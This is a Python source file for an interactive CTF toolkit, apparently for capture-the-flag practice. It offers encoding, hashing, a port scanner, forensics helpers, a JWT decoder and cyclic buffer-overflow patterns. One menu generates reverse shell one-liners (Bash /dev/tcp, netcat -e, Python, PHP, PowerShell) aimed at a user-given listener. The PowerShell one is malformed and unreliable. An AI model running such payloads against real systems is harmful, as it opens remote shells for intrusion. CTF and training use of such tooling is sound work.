import os
import sys
import base64
import hashlib
import binascii
import socket
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt, Confirm
    import requests
except ImportError:
    print("Please install requirements: pip install rich requests")
    sys.exit(1)

console = Console()

BANNER = """[bold red]
 ▄████▄ ▄▄▄█████▓ █████▒   ██ ▄█▀ ▄▄▄       ▄▄▄█████▓ ▄▄▄       ███▄    █  ▄▄▄      
▒██▀ ▀█ ▓  ██▒ ▓▒▓██   ▒   ██▄█▒ ▒████▄     ▓  ██▒ ▓▒▒████▄     ██ ▀█   █ ▒████▄    
▒▓█    ▄▒ ▓██░ ▒░▒████ ░  ▓███▄░ ▒██  ▀█▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄  
▒▓▓▄ ▄██▒ ▓██▓ ░ ░▓█▒  ░  ▓██ █▄ ░██▄▄▄▄██  ░ ▓██▓ ░ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██ 
▒ ▓███▀ ░ ▒██▒ ░ ░▒█░     ▒██▒ █▄ ▓█   ▓██▒   ▒██▒ ░  ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒
░ ░▒ ▒  ░ ▒ ░░    ▒ ░     ▒ ▒▒ ▓▒ ▒▒   ▓▒█░   ▒ ░░    ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░
  ░  ▒      ░     ░       ░ ░▒ ▒░  ▒   ▒▒ ░     ░      ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░
░         ░       ░ ░     ░ ░░ ░   ░   ▒      ░        ░   ▒      ░   ░ ░   ░   ▒   
░ ░                           ░        ░  ░                ░  ░         ░         ░  
░                                                                                   
[/bold red][bold white]                     CTF Swiss Army Knife - v1.0.0[/bold white]
"""

def print_banner():
    console.print(BANNER, justify="center")

def pause():
    Prompt.ask("\n[bold cyan]Press Enter to continue...[/bold cyan]", default="")

# ----------------------------
# CRYPTOGRAPHY
# ----------------------------
def rot13(text):
    import codecs
    return codecs.encode(text, 'rot_13')

def hex_encode(text):
    return binascii.hexlify(text.encode()).decode()

def hex_decode(text):
    try:
        return binascii.unhexlify(text.encode()).decode()
    except Exception as e:
        return f"[red]Error:[/red] {e}"

def crypto_menu():
    while True:
        console.clear()
        print_banner()
        console.print(Panel("[bold yellow]Cryptography Module[/bold yellow]", expand=False))
        console.print("\n1. Base64 Encode/Decode\n2. Hex Encode/Decode\n3. URL Encode/Decode\n4. ROT13\n0. Back")
        
        choice = Prompt.ask("\nSelect action", choices=["0", "1", "2", "3", "4"])
        if choice == "0": break
        
        if choice == "1":
            action = Prompt.ask("Action", choices=["encode", "decode"])
            text = Prompt.ask("Enter text")
            if action == "encode":
                res = base64.b64encode(text.encode()).decode()
            else:
                try: res = base64.b64decode(text.encode()).decode()
                except Exception as e: res = f"[red]Error:[/red] {e}"
            console.print(Panel(f"[bold green]Result:[/bold green] {res}"))
        
        elif choice == "2":
            action = Prompt.ask("Action", choices=["encode", "decode"])
            text = Prompt.ask("Enter text")
            res = hex_encode(text) if action == "encode" else hex_decode(text)
            console.print(Panel(f"[bold green]Result:[/bold green] {res}"))
            
        elif choice == "3":
            action = Prompt.ask("Action", choices=["encode", "decode"])
            text = Prompt.ask("Enter text")
            res = urllib.parse.quote(text) if action == "encode" else urllib.parse.unquote(text)
            console.print(Panel(f"[bold green]Result:[/bold green] {res}"))
            
        elif choice == "4":
            text = Prompt.ask("Enter text")
            res = rot13(text)
            console.print(Panel(f"[bold green]Result:[/bold green] {res}"))

        pause()

# ----------------------------
# HASHING
# ----------------------------
def hash_string(algo, text):
    h = hashlib.new(algo)
    h.update(text.encode())
    return h.hexdigest()

def hash_menu():
    while True:
        console.clear()
        print_banner()
        console.print(Panel("[bold yellow]Hashing Module[/bold yellow]", expand=False))
        console.print("\n1. MD5 Hash\n2. SHA1 Hash\n3. SHA256 Hash\n4. Identify Hash (Basic)\n0. Back")
        
        choice = Prompt.ask("\nSelect action", choices=["0", "1", "2", "3", "4"])
        if choice == "0": break
        
        if choice in ["1", "2", "3"]:
            algos = {"1": "md5", "2": "sha1", "3": "sha256"}
            text = Prompt.ask("Enter string to hash")
            res = hash_string(algos[choice], text)
            console.print(Panel(f"[bold green]{algos[choice].upper()} Result:[/bold green]\n{res}"))
        elif choice == "4":
            text = Prompt.ask("Enter Hash")
            length = len(text)
            if length == 32: res = "MD5 or NTLM"
            elif length == 40: res = "SHA-1"
            elif length == 64: res = "SHA-256"
            elif length == 128: res = "SHA-512"
            else: res = "Unknown format based on length."
            console.print(Panel(f"[bold green]Possible Hash Type:[/bold green] {res}"))
            
        pause()

# ----------------------------
# NETWORK
# ----------------------------
def port_scan(target, start_port, end_port):
    console.print(f"[cyan]Scanning {target} ({start_port}-{end_port})...[/cyan]")
    open_ports = []
    
    def check_port(port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        res = sock.connect_ex((target, port))
        if res == 0: open_ports.append(port)
        sock.close()

    with ThreadPoolExecutor(max_workers=50) as executor:
        for port in range(start_port, end_port + 1):
            executor.submit(check_port, port)
    
    if open_ports:
        table = Table(title="Open Ports")
        table.add_column("Port", justify="right", style="cyan")
        table.add_column("State", style="green")
        for p in sorted(open_ports):
            table.add_row(str(p), "OPEN")
        console.print(table)
    else:
        console.print("[red]No open ports found.[/red]")

def get_headers(url):
    if not url.startswith('http'): url = 'http://' + url
    try:
        r = requests.head(url, timeout=5, allow_redirects=True)
        table = Table(title=f"HTTP Headers for {url}")
        table.add_column("Header", style="cyan")
        table.add_column("Value", style="magenta")
        for k, v in r.headers.items():
            table.add_row(k, v)
        console.print(table)
    except Exception as e:
        console.print(f"[red]Failed to connect:[/red] {e}")

def network_menu():
    while True:
        console.clear()
        print_banner()
        console.print(Panel("[bold yellow]Network & Web Module[/bold yellow]", expand=False))
        console.print("\n1. Fast Port Scan\n2. Fetch HTTP Headers\n0. Back")
        
        choice = Prompt.ask("\nSelect action", choices=["0", "1", "2"])
        if choice == "0": break
        
        if choice == "1":
            target = Prompt.ask("Enter Target IP/Host")
            try:
                start = int(Prompt.ask("Start Port", default="1"))
                end = int(Prompt.ask("End Port", default="1024"))
                port_scan(target, start, end)
            except ValueError:
                console.print("[red]Invalid port numbers![/red]")
        elif choice == "2":
            url = Prompt.ask("Enter URL or IP")
            get_headers(url)

        pause()

# ----------------------------
# STEGANOGRAPHY / MISC
# ----------------------------
MAGIC_BYTES = {
    b'\\x89PNG\\r\\n\\x1a\\n': 'PNG Image',
    b'\\xff\\xd8\\xff': 'JPEG Image',
    b'PK\\x03\\x04': 'ZIP Archive',
    b'%PDF': 'PDF Document',
    b'GIF87a': 'GIF Image',
    b'GIF89a': 'GIF Image',
}

def check_magic(filepath):
    try:
        with open(filepath, 'rb') as f:
            header = f.read(16)
            for magic, filetype in MAGIC_BYTES.items():
                if header.startswith(magic.decode('unicode_escape').encode('latin-1')):
                    return filetype
            return f"Unknown (Header bytes: {binascii.hexlify(header)[:20].decode()}...)"
    except Exception as e:
        return str(e)

def extract_strings(filepath, min_len=4):
    import re
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
            # Simple strings regex for ascii
            strings = re.findall(b'[ -~]{%d,}' % min_len, data)
            console.print(f"[cyan]Found {len(strings)} strings:[/cyan]")
            with console.pager():
                for s in strings:
                    console.print(f"[green]{s.decode()}[/green]")
    except Exception as e:
        console.print(f"[red]Error:[/red] {e}")

def stego_menu():
    while True:
        console.clear()
        print_banner()
        console.print(Panel("[bold yellow]Steganography & Forensics Module[/bold yellow]", expand=False))
        console.print("\n1. Identify File (Magic Bytes)\n2. Extract Strings\n0. Back")
        
        choice = Prompt.ask("\nSelect action", choices=["0", "1", "2"])
        if choice == "0": break
        
        if choice == "1":
            path = Prompt.ask("Enter path to file")
            if os.path.exists(path):
                filetype = check_magic(path)
                console.print(Panel(f"[bold green]Guessed File Type:[/bold green] {filetype}"))
            else:
                console.print("[red]File not found.[/red]")
                
        elif choice == "2":
            path = Prompt.ask("Enter path to file")
            if os.path.exists(path):
                extract_strings(path)
            else:
                console.print("[red]File not found.[/red]")

        pause()

# ----------------------------
# WEB EXPLOITATION & PAYLOADS
# ----------------------------
def decode_jwt(token):
    import json
    parts = token.split('.')
    if len(parts) != 3:
        console.print("[red]Invalid JWT format. Expected 3 parts separated by dots.[/red]")
        return
    
    def pad_b64(b):
        return b + "=" * ((4 - len(b) % 4) % 4)
        
    try:
        header = base64.urlsafe_b64decode(pad_b64(parts[0])).decode('utf-8')
        payload = base64.urlsafe_b64decode(pad_b64(parts[1])).decode('utf-8')
        
        try:
            head_fmt = json.dumps(json.loads(header), indent=4)
        except json.JSONDecodeError: head_fmt = header
        
        try:
            pay_fmt = json.dumps(json.loads(payload), indent=4)
        except json.JSONDecodeError: pay_fmt = payload

        console.print(Panel(f"[bold cyan]Header:[/bold cyan]\n{head_fmt}\n\n[bold green]Payload:[/bold green]\n{pay_fmt}", title="JWT Decoder"))
    except Exception as e:
        console.print(f"[red]Error decoding JWT:[/red] {e}")

def rev_shell_menu():
    ip = Prompt.ask("Enter Listener IP")
    port = Prompt.ask("Enter Listener Port")
    
    shells = {
        "Bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "Netcat": f"nc -e /bin/sh {ip} {port}",
        "Python": f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
        "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "PowerShell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;}}"
    }
    
    for name, payload in shells.items():
        console.print(Panel(f"[bold cyan]{payload}[/bold cyan]", title=f"{name} Reverse Shell"))

def web_menu():
    while True:
        console.clear()
        print_banner()
        console.print(Panel("[bold yellow]Web Exploitation & Payloads Module[/bold yellow]", expand=False))
        console.print("\n1. Decode JWT (JSON Web Token)\n2. Generate Reverse Shell Payloads\n0. Back")
        
        choice = Prompt.ask("\nSelect action", choices=["0", "1", "2"])
        if choice == "0": break
        if choice == "1":
            token = Prompt.ask("Enter JWT string")
            decode_jwt(token)
        elif choice == "2":
            rev_shell_menu()
        pause()

# ----------------------------
# BINARY EXPLOITATION (PWN)
# ----------------------------
def msf_pattern(length):
    res = []
    for a in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        for b in "abcdefghijklmnopqrstuvwxyz":
            for c in "0123456789":
                res.append(f"{a}{b}{c}")
                if len("".join(res)) >= length:
                    return "".join(res)[:length]
    return ("".join(res) * (length // len("".join(res)) + 1))[:length]

def pwn_menu():
    while True:
        console.clear()
        print_banner()
        console.print(Panel("[bold yellow]Binary (Pwn) / Exploit Module[/bold yellow]", expand=False))
        console.print("\n1. Generate Cyclic Pattern (Buffer Overflow)\n2. Find Pattern Offset\n0. Back")
        
        choice = Prompt.ask("\nSelect action", choices=["0", "1", "2"])
        if choice == "0": break
        if choice == "1":
            try:
                length = int(Prompt.ask("Enter pattern length"))
                pat = msf_pattern(length)
                console.print(Panel(f"[bold green]{pat}[/bold green]", title=f"Pattern ({length} bytes)"))
            except ValueError:
                console.print("[red]Invalid length[/red]")
                
        elif choice == "2":
            val = Prompt.ask("Enter search value (e.g. string or hex like 0x41306141)")
            pat = msf_pattern(20000)
            
            if val.startswith("0x"):
                try:
                    val_bytes = bytearray.fromhex(val[2:])
                    val_bytes.reverse()
                    val_str = val_bytes.decode('ascii')
                except Exception:
                    val_str = val
            else:
                val_str = val
                
            offset = pat.find(val_str)
            if offset != -1:
                console.print(f"[bold green]Exact match found at offset: {offset}[/bold green] (Length: {len(val_str)})")
            else:
                console.print(f"[red]Not found in standard {len(pat)} length cyclic pattern.[/red]")
        pause()

# ----------------------------
# MAIN MENU
# ----------------------------
def main():
    while True:
        console.clear()
        print_banner()
        table = Table(show_header=True, header_style="bold magenta", expand=True)
        table.add_column("Option", style="cyan", width=10)
        table.add_column("Category", style="green")
        table.add_column("Description", justify="left")
        
        table.add_row("1", "Cryptography", "Encode/Decode, BaseX, Hex, ROT13")
        table.add_row("2", "Hashing", "Hash Generation and Identification")
        table.add_row("3", "Network & Web", "Port Scanner, Header Analysis")
        table.add_row("4", "Forensics", "Magic Bytes, Strings Extractor")
        table.add_row("5", "Web Payloads", "JWT Decoder, Reverse Shells")
        table.add_row("6", "Binary (Pwn)", "Cyclic Pattern & Offset")
        table.add_row("0", "Exit", "Leave Katana")
        
        console.print(table)
        choice = Prompt.ask("[bold yellow]Select a module[/bold yellow]", choices=["0", "1", "2", "3", "4", "5", "6"])
        
        if choice == "0":
            console.print("[bold green]Goodbye, Happy Hacking![/bold green]")
            break
        elif choice == "1":
            crypto_menu()
        elif choice == "2":
            hash_menu()
        elif choice == "3":
            network_menu()
        elif choice == "4":
            stego_menu()
        elif choice == "5":
            web_menu()
        elif choice == "6":
            pwn_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[bold red]Interrupted by user. Exiting...[/bold red]")
        sys.exit(0)
